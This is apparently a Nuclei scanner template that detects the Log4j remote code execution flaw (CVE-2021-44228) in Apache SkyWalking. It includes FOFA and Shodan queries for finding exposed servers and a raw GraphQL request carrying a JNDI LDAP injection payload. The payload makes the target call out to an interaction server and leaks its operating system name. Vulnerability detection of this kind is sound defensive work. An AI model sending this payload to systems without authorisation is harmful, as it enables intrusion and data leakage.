id: skywalking-log4j-rce
info:
  author: pwnhxl
  classification:
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'SkyWalking < 9.0.0 - Remote Code Execution.

    '
  metadata:
    fofa-query: title="SkyWalking"
    shodan-query: http.favicon.hash:1929532064
    verified: 'true'
  name: SkyWalking - Remote Code Execution (Apache Log4j)
  reference:
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://skywalking.apache.org/docs/main/next/en/changes/changes-9.0.0
  severity: critical
  tags: cve,cve2021,jndi,log4j,rce,oast,skywalking,kev
requests:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
    type: regex
  - part: body
    type: word
    words:
    - '"Invalid Syntax"'
  matchers-condition: and
  raw:
  - '@timeout: 10s

    POST /graphql HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    Content-Type: application/json


    {"query":"${jndi:ldap://${sys:os.name}.{{interactsh-url}}}","variables":{"duration":{"start":"2022-06-22
    1015","end":"2022-06-22 1030","step":"MINUTE"}}}

    '
